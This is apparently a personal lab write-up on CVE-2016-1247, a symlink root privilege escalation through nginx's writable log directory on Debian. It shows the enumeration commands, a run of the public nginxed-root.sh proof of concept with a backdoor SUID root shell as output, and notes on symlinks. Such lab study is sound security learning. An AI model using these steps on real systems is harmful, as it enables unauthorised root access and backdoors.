

### Requirements

- nginx 
	- version has to be 1.6.2 or younger
- sudo
	-  has to have a sticky bit



## Identification

linux-exploit-suggestor



### Nginx
1.6.2 or younger is better to check use

```
dpkg -l | grep nginx
```

```
root@debian:~# dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
```

### Sudo

suid bit **NEEDS** to be set on sudo

```
find / -type f -perm 04000 -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
```

```
TCM@debian:~/tools/nginx$ find / -perm -u=s -type f -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo   <----------------- we need this
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
<...SNIP...>

```


lets look at the logs, we also need drwxr-xr-x

```
ls -la /var/log/nginx
```

```
sh-4.1$ ls -la /var/log/nginx
total 12
drwxr-x--- 2 www-data adm      4096 Mar  9 08:36 .  <------- we have read write execute
drwxr-xr-x 9 root     root     4096 Mar  9 08:14 ..
-rw-r--r-- 1 www-data root        0 May 14  2017 access.log
-rw-r--r-- 1 www-data www-data    0 Mar  9 08:36 error.log
-rw-r--r-- 1 root     root     2438 May 14  2017 error.log.1
```


then we are going to use a symlink to replace a log file with a malicious file,  ascript will do it for us we are exploiting the symbolic link


we need a restart that is the condition we sort of need. there's a script already there called nginxed-root.sh and we need to point this to a sysmlink



okay now the commands to be done are the following

```
 /home/user/tools/nginx/nginxed-root.sh  /var/log/nginx/error.log 
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^
 This is the path to our script          Where we want to write things
```

```
sh-4.1$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.
             .-XXX(   O   O  )XXXXXXXXXXXXXXX-
            /XXX(       U     )        XXXXXXX\
          /XXXXX(              )--_  XXXXXXXXXXX\
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""

Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)
nginxed-root.sh (ver. 1.0)

Discovered and coded by:

Dawid Golunski
https://legalhackers.com

[+] Starting the exploit as:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at:   <---------- Shell insatlled
-rwxr-xr-x 1 www-data www-data 926536 Mar  9 08:25 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at:   <---------- Appears to be vulnerable
lrwxrwxrwx 1 www-data www-data 18 Mar  9 08:25 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges:
-rw-r--r-- 1 www-data root 19 Mar  9 08:25 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains:
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 926536 Mar  9 08:25 /tmp/nginxrootsh

[+] Rootshell got assigned root SUID perms at:
-rwsrwxrwx 1 root root 926536 Mar  9 08:25 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now!

```

then SSH or log into  another terminal in one way or another and do the following

```
invoke-rc.d nginx rotate >/dev/null 2>&1
```

```
root@debian:~# invoke-rc.d nginx rotate >/dev/null 2>&1
```


the end result is that the first termina that ran the nginxed exploit will have a `euid=0` basically root

```
The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now!

nginxrootsh-4.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)

```



https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html


---

Extra stuff
# Definition

Symlink
```
A symbolic link, also known as a symlink or soft link, is **a file that points to a file or directory by specifying a path thereto**.4 Unlike a hard link, a symbolic link does not contain the data in the target file but simply points to another entry somewhere in the file system.
```


# Soft vs hard (my pp LOL)

### Summary

Softlink = pointer to that file X (think of windows shortcuts)
hardlink = has the same content as file X but a different name


1. **Hard Links:**
    
    - A hard link is essentially another name for the same file. <---------------
    - All hard links to a file are equal; there's no original file. If you delete any of the hard links, the data remains accessible through other hard links.
    - Hard links cannot reference directories.
    - Changing the name or location of the original file does not affect hard links.
    - Example: 
	    - Let's say you have a file named "original.txt". You create a hard link to it named "hardlink.txt". Both "original.txt" and "hardlink.txt" refer to the same data on the disk. If you delete "original.txt", "hardlink.txt" will still contain the data.
    
2. Soft Links (Symbolic Links):

	- A soft link is a pointer to the original file or directory. It's more like a shortcut in Windows.
	- Deleting the original file renders the symbolic link broken or dangling.
	- Symbolic links can point to directories.
	- If you move or rename the original file, the symbolic link will be broken unless it's a relative path.
	- Example:
		- Suppose you have a file named "original.txt" and you create a symbolic link to it named "symlink.txt". If you delete "original.txt", "symlink.txt" becomes a dangling link, meaning it points to nothing. However, if you move "original.txt" to a different directory, "symlink.txt" will still point to the original file if it was created with an absolute path, but it will be broken if it was created with a relative path that no longer matches the new location.

In summary, hard links are like multiple names for the same file, while symbolic links are pointers to files or directories. Hard links preserve the link between files even if one link is deleted, whereas symbolic links can be more flexible in pointing to different locations but are more fragile in terms of link preservation.



# Understanding the CVE

https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html